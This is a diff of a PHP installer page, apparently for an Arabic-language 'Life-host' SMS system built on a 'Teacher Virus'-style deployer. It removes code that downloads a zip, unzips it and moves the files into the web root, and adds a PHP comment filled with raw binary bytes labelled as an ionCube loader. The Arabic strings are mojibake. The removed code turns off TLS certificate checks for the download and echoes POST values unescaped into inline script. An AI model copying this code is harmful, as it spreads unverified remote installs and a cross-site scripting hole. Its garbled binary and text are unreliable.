-                    // http://stackoverflow.com/questions/19177070/copy-image-from-remote-server-over-https
-                    // http://stackoverflow.com/questions/18974646/download-zip-php
-                    // http://stackoverflow.com/questions/11321761/using-curl-to-download-a-zip-file-isnt-working-with-follow-php-code
-
-                    set_time_limit(0); //prevent timeout
-
-                    $fp = fopen($zipfile, 'w+'); // or perhaps 'wb'?
-                    if (!$fp) {
-                         exit("<h3><b>ÿÆÿ∑ÿ£ ŸÅŸä ÿßÿ™ÿµÿßŸÑŸÉ ÿ®ÿßŸÑÿ¢ŸÜÿ™ÿ±ŸÜÿ™ ÿ®ÿ∑Ÿäÿ° ÿßŸà ÿ∫Ÿäÿ± ŸÖÿ™ÿµŸÑ</h3>
-                       // <p>Unable to open temporary file: <b>$zipfile</b>!</p>
-                       // <p>File permission issue maybe?
-                        ");
-                    }
-
-                    // ** TO DO ** add catch exception for curl not installed (e.g. RPI)
-                    $ch = curl_init();
-
-                    // CURL settings from Reference: http://php.net/manual/en/function.curl-setopt.php
-
-                    // curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Don't use!
-                    curl_setopt($ch, CURLOPT_URL, $geturl);
-                    curl_setopt($ch, CURLOPT_FILE, $fp);
-                    curl_setopt($ch, CURLOPT_HEADER, 0);
-                    curl_setopt($ch, CURLOPT_TIMEOUT, 50); // or 5040? - ** TO DO: Further testing required to optimise setting
-                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2); // was 2 try 0
-                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-                    // curl_setopt($ch, CURLOPT_SSLVERSION, 4);
-                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-                    curl_setopt($ch, CURLOPT_FAILONERROR, true);
-
-                    curl_exec($ch);
-                    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);  // Check connection status
-                    $curl_error_result = curl_error($ch);
-
-                    // Check if there were curl errors
-                    if ($curl_error_result) {
-                        $curlFlag=0; // Any contents means "true" - i.e. There's an error message so there were errors
-                    } else {
-                        $curlFlag=1; // false means all good - there were no errors
-                    }
-
-                    $downloadResult=0;
-                    if (($http_status==200)&&(file_exists($zipfile))&&($curlFlag)) {
-                        if ($debug) {
-                           // echo "<p> HTTP Status of: $http_status (200 is good)</p>";
-                           // echo "<p> Zip file successfully downloaded to $zipfile</p>";
-                        }
-                        $downloadResult=1;
-                    } else {
-                        if ($debug) {
-                            // There was a problem downloading
-                          //  echo "<h3>Curl Download Failed!</h3>
-                           //     <p>Error Downloading Teacher Virus via CURL</p>";
-                          //  echo "<p> HTTP Status of: $http_status (200 is good)</p>";
-                          //  echo "<p> CURL error: ".curl_error($ch)." ...</p>";
-                            if (file_exists($zipfile)) {
-                             //   echo "<p> Destination $zipfile file was created though</p>";
-                            }   else {
-                              //  echo "<p> Destination $zipfile file was <b>NOT</b> created - file permission issue? </p>";
-                            }
-
-                        } // END debug
-
-                    } // END http_status and file exists check
-
-                    curl_close($ch);
-                    fclose($fp);
-
-                    if (!$downloadResult) {
-                        // As download failed delete empty zip file!
-                        if ($debug) { echo "<h2>Download with CURL failed</h2>";}
-                     //   echo "<h3>Infection Failed!</h3><p>Couldn't download with either copy or curl</p>";
-                                                exit();
-                        unlink($zipfile);
-                        //promptForIP();
-                    } // If Download failed using CURL
-                }// END else CURL
-
-                // Code Attribution:
-                // http://stackoverflow.com/questions/8889025/unzip-a-file-with-php
-
-               // if ($debug) {echo "<h2>Attempting to Unzip</h2><p>Zipped file:  $zipfile </p>";}
-
-                // get the absolute path to $file - not used as using location of script instead
-                // $path = pathinfo(realpath($zipfile), PATHINFO_DIRNAME);
-
-                // Create full temp sub_folder path
-                $temp_unzip_path = uniqid('unzip_temp_', true)."/";
-
-              //   if($debug) { echo "Temp Unzip Path is: ".$temp_unzip_path."<br>"; }
-
-                // Make the new temp sub_folder for unzipped files
-                if (!mkdir($temp_unzip_path, 0755, true)) {
-                 //    exit("<h2>Error - Infection Failed!</h2><p> Could not create unzip folder: $temp_unzip_path</p><p>File security or permissions issue?");
-                } else {
-                  //   if($debug) { echo "<p>Temp unzip Folder Created! <br>"; }
-                }
-
-                umask(0);
-                $zip = new ZipArchive;
-                $zipFlag = $zip->open($zipfile);
-                if ($zipFlag == TRUE) {
-                    // extract it to the path we determined above
-                  $zip->extractTo($temp_unzip_path);
-                  // $zip->extractTo($path);
-                  $zip->close();
-                 //   if($debug) { echo "<h3>Unzip Successful!</h3><p> $zipfile extracted to $temp_unzip_path </p>"; }
-                } else {
-                 //   exit("<h2>Infection Failed!</h2><p> couldn't open $zipfile </p>");
-                }
-
-
-                // -------------------------
-                // Determine Subfolder Name
-                // -------------------------
-
-                // GitHub puts all files in an enclosing folder that has a changing suffix every time.
-                // It does this to indicate commits.
-                // As a result we can't assume the name of the folder.
-                // and need to determine the name of the subfolder
-
-              //  if($debug) { echo "<h2>Determine Github subfolder</h2><p>Starting from folder: $temp_unzip_path </p>"; }
-                $subfolder='notset';
-
-                $files = scandir($temp_unzip_path);
-
-                $tally=0;
-                foreach($files as $file) {
-                    $tally++;
-                    // if($debug) {echo "Filename: $file";}
-                    if (substr( $file ,0,1) != ".") {
-                        $subfolder=$temp_unzip_path.$file;
-                    } // END if not .
-
-                } // END foreach
-
-                // if($debug) { echo "<p><b>Tally:</b> $tally </p>";}
-               //  if($debug) { echo "<p>Subfolder is : $subfolder </p>";}
-
-
-                // ----------
-                // Move Files To Root
-                // ----------
-                // move unzipped files to the same directory as the script (should be root)
-                // Warning/TEST! it probably won't move hidden files?
-
-                //if($debug) { echo "<H2>Moving Files</h2>"; }
-
-                // $startingloc = $temp_unzip_path.'/'.$subfolder;
-                $startingloc = $subfolder;
-
-                //if($debug) { echo "<p>Files being moved from: $startingloc </p>"; }
-
-                $tally2=0;
-
-                $subfolder = realpath($subfolder);
-               //  if($debug) { echo "<p>Real Path is : $subfolder </p>"; }
-
-                //if($debug) { echo "<p>Is subfolder directory readable? ".is_readable($subfolder)."</p>";}
-
-                $directory_iterator = new RecursiveDirectoryIterator($subfolder,FilesystemIterator::SKIP_DOTS);
-
-                $fileSPLObjects =  new RecursiveIteratorIterator($directory_iterator, RecursiveIteratorIterator::SELF_FIRST,RecursiveIteratorIterator::CATCH_GET_CHILD);
-
-                try {
-
-                  foreach($fileSPLObjects as $file) {
-                    $tally2 ++;
-                        $filename= $file->getFilename();
-                        //if($debug) { echo "<p>Current Filename: $filename </p>"; }
-
-                        if (($file->isDir())&&(substr( $filename ,0,1) != ".")) {
-                        // As it's a directory make sure it exists at destination:
-
-                        // Destination:
-                        $newDir = str_replace("/".$startingloc, '', realpath($file));
-                        // if directory doesn't exist then create it
-                        if (!makeDIR($newDir,$debug)) {
-                            if($debug) { echo "<p>Failed to create directory: $newDir</p>"; }
-                        }
-                    } else {
-                        // It's a file so move it
-                        // ** TEST: what if directory hasn't been created yet?? or does Recursive always do the directory first
-                        $currentFile = realpath($file); // current location
-                        if(preg_match('/.gitignore/',$currentFile))
-                        {
-                            $aExplodeCurrentFile = explode('.gitignore', $currentFile);
-                            $currentFile = $aExplodeCurrentFile[0];
-                        }
-                        $newFile = str_replace("/".$startingloc, '', realpath($file)); // Destination
-                        if(preg_match('/.gitignore/',$newFile))
-                        {
-                            $aExplodeNewFile = explode('.gitignore', $newFile);
-                            $newFile = $aExplodeNewFile[0];
-                        }
-                        // if file already exists remove it
-                        if (file_exists($newFile) && !is_dir($newFile)) {
-                            //if($debug) { echo "<p>File $newFile already exists - Deleting</p>"; }
-                            ($bChmod) ? chmod($newFile, 0755) : '';
-                            unlink($newFile);
-                        }
-
-                        // Move via rename
-                        // rename(oldname, newname)
-                        //rename($currentFile, $newFile);
-                        if(!file_exists($newFile))
-                        {
-                            if (rename($currentFile , $newFile)) {
-                                ($bChmod) ? chmod($newFile, 0755) : '';
-                                //if($debug) { echo "<p>Moved $currentFile to $newFile</p>"; }
-                            } else {
-                                //if($debug) { echo "<p>Failed to move $currentFile to $newFile</p>"; }
-                                $result = false;
-                            } // END rename
-                        }
-                    }// END is Dir or File checks
-
-                  } // END foreach
-                } // END Try
-                catch (UnexpectedValueException $e) {
-                //    echo "<h2>Error Moving Files!</h2>";
-                    if($debug) {echo "<p>There was a directory we couldn't get into!</p>";}
-                }
-            //    if ($debug) {echo "<p>Loop Count: $tally2</p>";}
-
-                // --------------------
-                // HANDLE MOVE FAILURE:
-                // IF Tally2 is zero then move failed try alternative method based on scandir
-
-                if ($tally2==0) {
-                    //if($debug) { echo "<h2>File Move Failed!</h2><p> - Attempting alternative approach</p>"; }
-
-                    $destination  = dirname(__FILE__);
-
-                    //if($debug) { echo "<p>Moving files from<br>  $subfolder <br> to: $destination</p>"; }
-
-                    if (moveDIR($subfolder,$destination)) {
-                        //if($debug) { echo "<h2>Move Succeeded!</h2>"; }
-                    } else {
-                        //if($debug) { "<h2>ERROR! Move Failed!</h2><p>Infection Failed</p>"; }
-                    } // End moveDIR check
-
-                } // END try alternative move approach
-
-                // DELETE TEMP
-                // Recursively Delete temporary unzip location
-                rrmdir($temp_unzip_path);
-
-                // redirect page to admin page to commence configuration
-                // ** TO DO ***
-
-                // current test stub instead of admin page opens in new window:
-                if(file_exists(getcwd().'/data/bootstrap.php'))
-                {
-                    require(getcwd().'/data/bootstrap.php');
-                    $protocol = SITE_URL;
-                    if(file_exists(getcwd().'/IP.txt'))
-                    {
-                        $myfile = fopen(getcwd().'/IP.txt', "r") or die("Unable to open file!");
-                        $protocol = fread($myfile,filesize(getcwd().'/IP.txt'));
-                        $protocol = trim($protocol);
-                    }
-                }
-                echo '<h2>ÿ¥ŸÉÿ±ÿ¢ ŸÑŸÉ ÿßŸÜÿ™/Ÿä ÿ±ÿßÿ¶ÿπ/ÿ© ÿ™ŸÖ ÿßŸÑÿ™ÿ±ŸÉŸäÿ® ŸàÿßŸÑÿ¢ÿπÿØÿßÿØ ÿ®ŸÜÿ¨ÿßÿ≠</h2><h2><a href="'.$protocol.'/index.php"> ÿßŸÑÿÆÿ∑Ÿàÿ© ÿßŸÑÿ¢ÿÆŸäÿ±Ÿá . . </a></h2>'; $_SESSION['isValidation']['flag'] = FALSE;
-                $installed=1;
-            } // END Download if zipfile doesn't already exists
-        }
-    }
-    function redirect($filename)
-    {
-        if (!headers_sent())
-            header('Location: '.$filename);
-        else {
-            echo '<script type="text/javascript">';
-            echo 'window.location.href="'.$filename.'";';
-            echo '</script>';
-            echo '<noscript>';
-            echo '<meta http-equiv="refresh" content="0;url='.$filename.'" />';
-            echo '</noscript>';
-        }
-    }
-if($_SESSION['isValidation']['flag'] == 1)
-        unset($_SESSION['isValidation']['user_name_required'],$_SESSION['isValidation']['repository_required']);
-
-    if($_SESSION['isValidation']['flag'] == 1 || count($_SESSION['isValidation']) > 1)
-    {
-        $_SESSION['isLoggedIn'] = isset($_SESSION['isLoggedIn']) ? $_SESSION['isLoggedIn'] : FALSE;
-        if((is_dir("admin") && (isset($_SESSION['isLoggedIn']) && !$_SESSION['isLoggedIn'])) || (isset($_GET['isValidUser']) && (isset($_SESSION['isLoggedIn']) && !$_SESSION['isLoggedIn'])))
-        {
-            if(file_exists(getcwd().'/data/bootstrap.php'))
-            {
-                require(getcwd().'/data/bootstrap.php');
-                $protocol = SITE_URL;
-                if(file_exists(getcwd().'/IP.txt'))
-                {
-                    $myfile = fopen(getcwd().'/IP.txt', "r") or die("Unable to open file!");
-                    $protocol = fread($myfile,filesize(getcwd().'/IP.txt'));
-                    $protocol = trim($protocol);
-                }
-            }
-            else
-            {
-                $sSiteUrl = (isset($_SERVER["HTTP_HOST"]) ? "http://".$_SERVER["HTTP_HOST"] : '');
-                $sRequestUrl = $sSiteUrl.$_SERVER['REQUEST_URI'];
-                //$protocol = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] && $_SERVER['HTTPS'] != "off") ? "https" : "http";
-                $protocol = $sRequestUrl;//"://" . $_SERVER['HTTP_HOST'];
-                if(file_exists(getcwd().'/IP.txt'))
-                {
-                    $myfile = fopen(getcwd().'/IP.txt', "r") or die("Unable to open file!");
-                    $protocol = fread($myfile,filesize(getcwd().'/IP.txt'));
-                    $protocol = trim($protocol);
-                }
-            }
-            redirect($protocol.'/admin');
-        }
-        else if(!$installed)
-        {
-?>
-        <script type="text/javascript">
-            function showData(divId)
-            {
-                if(divId == "infected_device")
-                {
-                  document.getElementById("infected_device").style.display = "block";
-                  document.getElementById("branch_value").style.display = "none";
-                }
-                else if(divId == "branch_value")
-                {
-                    document.getElementById("infected_device").style.display = "none";
-                    document.getElementById("branch_value").style.display = "block";
-                }
-            }
-            function changeValue(boxId)
-            {
-                if (document.getElementById(boxId).checked)
-                {
-                    document.getElementById(boxId).value = 1;
-                }
-                else
-                {
-                    document.getElementById(boxId).value = 0;
-                }
-                if(boxId == "remove_previous_install")
-                {
-                    document.getElementById("delete_data").checked = true;
-                    document.getElementById("delete_payload").checked = true;
-                    document.getElementById("admin_payload").checked = true;
-                    document.getElementById("delete_content").checked = true;
-                    document.getElementById("delete_data").value = 1;
-                    document.getElementById("delete_payload").value = 1;
-                    document.getElementById("admin_payload").value = 1;
-                    document.getElementById("delete_content").value = 1;
-                }
-                if(boxId == "download_latest_version")
-                {
-                    if (document.getElementById(boxId).checked)
-                    {
-                        document.getElementById("infection_sources").style.display = "block";
-                    }
-                    else
-                    {
-                        document.getElementById("infection_sources").style.display = "none";
-                    }
-                }
-            }
-            function removePort(textId)
-            {
-                document.getElementById(textId).value = '';
-            }
-            function showMain(mainId)
-            {
-                var buttonId = document.getElementById('show_settings');
-                var deleteButtonId = document.getElementById('show_delete_option');
-                var divId = document.getElementById('delete_file');
-                if(mainId != "")
-                {
-                    document.getElementById(mainId).style.display = "block";
-                    document.getElementById("setting_value").value = 'main';
-                    buttonId.value= 'Hide Advanced Settings';
-                    deleteButtonId.value = 'Hide Options';
-                    divId.style.display = 'block';
-                }
-                else
-                {
-                    document.getElementById("setting_value").value = 'main';
-                    buttonId.value= 'Show Advanced Settings';
-                    deleteButtonId.value = 'Show Options';
-                    divId.style.display = 'none';
-                }
-            }
-            function disableDelete(isInstalledInfect)
-            {
-                if(isInstalledInfect == 1)
-                {
-                    document.getElementById("delete_data").checked = false;
-                    document.getElementById("delete_payload").checked = false;
-                    document.getElementById("admin_payload").checked = false;
-                    document.getElementById("delete_content").checked = false;
-                    document.getElementById("delete_data").value = 0;
-                    document.getElementById("delete_payload").value = 0;
-                    document.getElementById("admin_payload").value = 0;
-                    document.getElementById("delete_content").value = 0;
-                }
-            }
-            window.onload = function ()
-            {
-                showData("<?php echo isset($_POST['infection_resource']) ? $_POST['infection_resource'] : (INFECTED_RESOURCE == "G") ? 'branch_value' : 'infected_device'; ?>");
-                showMain("<?php echo isset($_POST['setting_value']) ? $_POST['setting_value'] : ''?>");
-                disableDelete("<?php echo is_dir(ROOT_DIR."/admin") ? 1 : 0; ?>")
-            }
-            function toggleVisibility(id,inputid)
-            {
-                var divId = document.getElementById(id);
-                var buttonId = document.getElementById(inputid);
-                if (divId.style.display == 'block' || divId.style.display=='')
-                {
-                    buttonId.value= 'Show Advanced Settings';
-                    divId.style.display = 'none';
-                }
-                else
-                {
-                    buttonId.value= 'Hide Advanced Settings';
-                    divId.style.display = 'block';
-                }
-            }
-            function toggleDeleteFile(id,buttonid)
-            {
-                 var divId = document.getElementById(id);
-                 var buttonId = document.getElementById(buttonid);
-                 if (divId.style.display == 'block' || divId.style.display=='')
-                {
-                    buttonId.value = 'Show Options';
-                    divId.style.display = 'none';
-                }
-                else
-                {
-                    buttonId.value = 'Hide Options';
-                    divId.style.display = 'block';
-               }
-            }
-        </script>
-    <?php
-        if (is_dir(ROOT_DIR."/admin"))
-        {
-    ?>
-        <link href="<?php echo $protocol; ?>/css/font-awesome/css/font-awesome.min.css" rel="stylesheet">
-            <div class="color-white">
-                <a class="play_img" href="<?php echo $protocol.'/admin'; ?>">
-                    <i class="mainNav fa fa-arrow-circle-left fa-3x"></i>
-                </a>
-            </div><br/><br/>
-    <?php
-        }
-    ?>
-    <form method="post" action="" id="getinfected_form">
-        <div id="container">
-            <div class="payload-details">
-                <?php
-                    echo is_dir(ROOT_DIR."/admin") ? "<div class='text'><h2>ŸÖÿ≥ÿ™ÿπÿØ ŸÑÿ™ÿ¥ÿ∫ŸäŸÑ ŸÑÿßŸäŸÅ ÿ®ŸäŸÑ</h2></div>" : "<div class='text'><h2>ŸÖÿ≥ÿ™ÿπÿØ ŸÑŸÑÿ™ÿ¥ÿ∫ŸäŸÑ :)</h2></div>";
-                ?>
-
-                
-                
-            </div>
-            <div class="full-widthdebug" style="width: 317px; height: 266px">
-                <p align="center"><font color="#FF0000"><b>&nbsp;</b></font><img src="mohamedgpaly.png" width="283" height="292"><p align="center">
-				<font color="#FF0000"><b>ŸÖÿ±ÿ≠ÿ®ÿ¢ ÿ®ŸÉ ÿßŸÜÿ™ ÿßŸÑÿ¢ŸÜ ÿπŸÑŸä Ÿàÿ¥ŸÉ ÿ®ÿØÿ° ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ 
-				Ÿàÿ®ÿØÿ° ÿßŸÑÿπŸÖŸÑ</b></font><p align="center">
-				<font color="#000000"><b>ÿ¥ŸÉÿ±ÿ¢ ŸÑÿ¢ÿ≥ÿ™ÿÆÿØÿßŸÖ ŸÑŸÜÿ∏ÿßŸÖ Ÿàÿ™ÿ∑ÿ®ŸäŸÇ ŸÑÿßŸäŸÅ<span lang="en-us">
-				</span>ÿ®Ÿàÿ≥ÿ™ <span lang="en-us">SMS</span> 
-				ŸÜÿ∏ÿßŸÖ ÿßŸÑÿπŸÖŸÑ ŸÑÿØŸäŸÉ ÿßŸÑÿ¢ŸÜ ŸÇÿØ ÿ™ŸÖ ÿ™ÿ±ŸÉŸäÿ®Ÿá Ÿàÿ™ŸÖ ÿßŸÑÿ¢ÿπÿØÿßÿØ ÿ®ÿßŸÑŸÅÿπŸÑ </b></font>
-				<p align="center"><b>ŸÉŸÑ ŸÖÿßÿπŸÑŸäŸÉ ŸÅÿπŸÑŸá ÿßŸÑÿ¢ŸÜ 
-				ŸáŸà ÿßŸÑÿØÿÆŸàŸÑ ŸÖŸÜ ÿßŸä ÿ¨Ÿáÿßÿ≤ ŸÉŸÖÿ®ŸäŸàÿ™ÿ± ÿßŸà ÿ¨Ÿáÿßÿ≤ ŸÑŸàÿ≠Ÿä ÿßŸà ÿπÿ®ÿ± ÿ®ÿ±ŸÜÿßŸÖÿ¨ ŸÑÿßŸäŸÅ 
-				ÿ®Ÿàÿ≥ÿ™ ÿ≥ÿ∑ÿ≠ ÿßŸÑŸÖŸÉÿ™ÿ® </b>
-				<p align="center"><span lang="en-us"><b>
-                 <?php				
-				$myfile = fopen("IP.txt", "r") or die("Unable to open file!");
-echo fread($myfile,filesize("IP.txt"));
-fclose($myfile);
-
-?>
-				</b></span><p align="center">
-				<b>ŸàŸäÿ¥ÿ™ÿ±ÿ∑ ÿ≠ÿ™Ÿä ŸäÿπŸÖŸÑ ÿßŸÜ ŸäŸÉŸàŸÜ ÿßŸÑÿ¨Ÿáÿßÿ≤ ÿßŸà ÿßŸÑÿ∑ÿ±ŸÅ 
-				ÿßŸÑÿ¢ÿÆÿ± ŸÖÿ™ÿµŸÑ ÿ®ŸÜŸÅÿ≥ ÿßŸÑÿ¥ÿ®ŸÉŸá ÿßŸÑÿÆÿßÿµŸá ÿ®ŸÉ ÿßŸà ŸÜŸÅÿ≥ ÿßŸÑŸàÿßŸä ŸÅÿßŸä </b>
-				<p align="center">&nbsp;</div>
-				
-            <div id="main" style="display:none">
-                <?php
-                if (is_dir(ROOT_DIR."/components"))
-                {
-                ?>
-                    <div class="go-button">
-                                        <div class="full-widthdebug">
-
-                        <p align="center">&nbsp;</div>
-                    <div class="full-chmod">
-                    <?php
-                    }
-                    ?>
-                </div>
-                <head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta http-equiv="Content-Language" content="ar-eg">
-</head>
-                <div class="full-widthdebug">
-                    <div class="mandatory">
-						<p align="center" dir="rtl">ÿ¥ŸÉÿ±ÿ¢ ŸÑÿ¢ÿ≥ÿ™ÿÆÿØÿßŸÖ ŸÑÿÆÿØŸÖÿßÿ™ 
-						<font color="#FFFFFF">ŸÑÿßŸäŸÅ 
-						ŸáŸàÿ≥ÿ™ ŸàÿßŸáŸÑÿ¢ ŸàŸÖÿ±ÿ≠ÿ®ÿ¢ ÿ®ŸÉ ŸÅŸä ÿ™ÿ∑ÿ®ŸäŸÇ ŸàŸÜÿ∏ÿßŸÖ ÿßŸÑÿπŸÖŸÑ ÿßŸÑÿÆÿßÿµ 
-						ÿ®ÿßŸÑÿ≠ÿ≥ÿßÿ®ÿßÿ™ ŸàÿßÿØÿßÿ±ÿ© ÿßŸÑŸÖÿ™ÿßÿ¨ÿ± ŸàÿßŸÑÿ¥ÿ±ŸÉÿßÿ™ ŸàÿßŸÑÿÆÿØŸÖÿßÿ™ ŸàÿßŸÑŸÅŸàÿßÿ™Ÿäÿ± 
-						....... ÿßŸÜÿ™ ÿßŸÑÿ¢ŸÜ ÿπŸÑŸä Ÿàÿ¥ŸÉ ÿßŸÑÿ¢ŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿ™ÿ±ŸÉŸäÿ® ÿßŸÑŸÜÿ∏ÿßŸÖ</font><p align="center" dir="rtl">
-						<font color="#FFFFFF">ÿ≥Ÿäÿ™Ÿàÿ¨ÿ® ÿπŸÑŸäŸÉ ÿßŸÑÿ¢ŸÜ ÿßŸÑÿ∂ÿ∫ÿ∑ ÿπŸÑŸä ÿ≤ÿ± ÿßŸÑÿ®ÿØÿ° ŸàÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ Ÿàÿ™ÿ£ŸÉÿØ ŸÇÿ®ŸÑ 
-						ÿ∞ŸÑŸÉ ÿßŸÜ ÿßÿ™ÿµÿßŸÑŸÉ ÿ®ÿßŸÑÿ¢ŸÜÿ™ÿ±ŸÜÿ™ ŸäÿπŸÖŸÑ ÿ®ÿ≥ÿ±ÿπÿ© ÿ¨ŸäÿØÿ© ŸÑÿ¢ŸÜŸá ÿ≥Ÿäÿ™ŸÖ ÿ™ŸáŸäÿ¶Ÿá 
-						ÿßŸÑŸÜÿ∏ÿßŸÖ ÿπÿ®ÿ± ÿßŸÑÿ¢ŸÜÿ™ÿ±ŸÜÿ™ ŸÅŸÇÿ∑ ÿ£ŸàŸÑ ŸÖÿ±Ÿá Ÿàÿ™ŸÜÿ≤ŸäŸÑ ÿßŸÑÿ™ÿ≠ÿØŸäÿ´ÿßÿ™ ÿßŸÑÿ¢ÿ≤ŸÖŸá</font></div>
-                </div>
-            </div>
-            <div class="go-button" style="width: 312px; height: 44px">
-                <p align="center">
-                <input type="button" name="button" id="button" value="ÿ£ÿ∂ÿ∫ÿ∑ ŸáŸÜÿß ŸÑÿ®ÿØÿ° ÿßŸÑÿ¢ÿπÿØÿßÿØ ŸàÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ" align="center" onclick="checkLoaded(true);">
-            </div><br/>
-            <div class="full-widthdebug" style="width: 314px; height: 159px">
-                <div class="mandatory">
-					<p align="center" dir="rtl">ÿ¨ŸÖŸäÿπ ÿßŸÑÿ≠ŸÇŸàŸÇ ŸÖÿ≠ŸÅŸàÿ∏Ÿá ŸÑÿØŸä ŸÖ.ŸÖÿ≠ŸÖÿØ 
-					ÿ¨ÿ®ŸäŸÑŸä ŸàŸÑÿØŸä ŸÅÿ±ŸäŸÇ ÿπŸÖŸÑ ŸÑÿßŸäŸÅ ŸáŸàÿ≥ÿ™ <span lang="en-us">
-					Life-host.info</span> </p>
-					<p align="center" dir="rtl"><font color="#000000">ŸäŸÖŸÉŸÜŸÉ ÿ∑ŸÑÿ® 
-					ÿ™ÿ±ŸÇŸäŸá ÿßŸà ÿ∑ŸÑÿ® ÿπŸÖŸÑ ÿÆÿßÿµ ÿ®ŸÉ ÿπÿ®ÿ± ÿßŸÑÿ¢ÿ™ÿµÿßŸÑ ÿ®ŸÜÿß ŸÜÿ≠ŸÜ ŸÜŸÇÿ®ŸÑ ÿßŸÑÿ∑ŸÑÿ®ÿßÿ™
-					</font> </div>
-            </div>
-            <?php
-                if(file_exists(ROOT_DIR."/version.txt"))
-                {
-                    $myfile = fopen(ROOT_DIR."/version.txt", "r") or die("Unable to open file!");
-                    $sVersion = fread($myfile,filesize(ROOT_DIR."/version.txt"));
-                    $sVersion = trim($sVersion);
-            ?>
-                    <div class="full-widthdebug">
-                        <div class="mandatory"><?php echo $sVersion; ?></div>
-                    </div>
-            <?php
-                }
-            ?>
-        </div>
-        <input type="hidden" name="setting_value" id="setting_value">
-    </form>
-<?php
-        }
-    }
-?>
-    </body>
-</html>
+<?php /* AndroidServer-Lifehost.info-Service-C#-Java-ionCube Loader-ZendË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
+?∞xË????É?]??????jhp-¥xË\◊ ã}ã˜â}‡3?3?;˚ï?;?uËË? É?É??taã?;?wã?M¸+?;?rPã}ÙÎ)ãE¸æ VPËÑ???YYÉ??t)?E¸ãFKâE?Ö??E?   Ö?ÖA???ãEÈ????ÉN ã?+?3?˜uÈ????ÉN ãEÙÎÎ?????jh0-¥xË? 3?9ut)9ut$3?9uï?;?u ËØp???    VVVVVË?? É?3?Ë? ??uË????Yâu¸?u?u?u?uË8???É?âE??E¸????Ë   ãE?Î??uËC???Y??????jhP-¥xËz? 3?3?9uï?;?uË2p???    VVVVVËT? É?É??Î<3?9uï?;?t◊?uËt???Yâu¸?u?u?u?u?UÉ?âE??E¸????Ë	   ãE?ËS? ??uËª???Y??????ã?Uã??EPj ?u?uh≥∞∞xË]???É?]??????ã?Uã??EP?u?u?uh≥∞∞xË7???É?]??????ã?Uã??EPj ?u?uh
+?∞xË???É?]??????ã?Uã??EP?u?u?uh
